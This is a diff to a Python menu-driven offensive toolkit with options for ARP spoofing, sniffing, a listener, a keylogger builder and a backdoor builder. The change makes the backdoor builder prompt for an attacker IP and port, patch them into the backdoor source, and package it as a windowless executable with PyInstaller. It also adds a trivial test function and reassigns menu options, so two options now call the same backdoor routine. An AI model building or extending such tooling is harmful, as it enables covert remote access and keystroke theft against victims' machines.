@@ -55,10 +55,26 @@ def sniff():
     sniffing.sniff(iface)
 
 def Backdoor():
-    sb.call(["pyinstaller","--onefile","-w","Bacdoor/my_socket.py"])
+    ip = input("enter ip adress: ")
+    port = input("enter port: ")
+    with open("Bacdoor/Backdoor.py","r") as file:
+        a=file.read()
+        a=a.replace("0.0.0.0",ip)
+        a=a.replace("4545",port)
+    with open("Bacdoor/Backdoor.py","w") as file:
+        file.write(a)
+    sb.call(["pyinstaller","--onefile","-w","Bacdoor/Backdoor.py"])
     
 def keylogger():
     sb.call(["pyinstaller","--onefile","-w","keylogger.py"])
+
+def test():
+    with open("test.txt","r") as file:
+        a =file.read()
+        a=a.replace("iyim","ip")
+    with open("test.txt","w") as file:
+        file.write(a)
+
 
 while True:
     print(a)
@@ -66,14 +82,18 @@ while True:
     try:
         if  user_input == 'use 9':
             change_mac()
+        elif user_input == 'use 7':
+            Backdoor()
         elif user_input == 'use 3':
             netscan()
+        elif user_input == 'use 13':
+            test()
         elif user_input == 'use 2':
             sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
             arp_spoof()
         elif user_input == 'use 4':
             sniff()
-        elif user_input == 'use 7':
+        elif user_input == 'use 8':
             Listen()
         elif user_input == 'use 10':
             Backdoor()
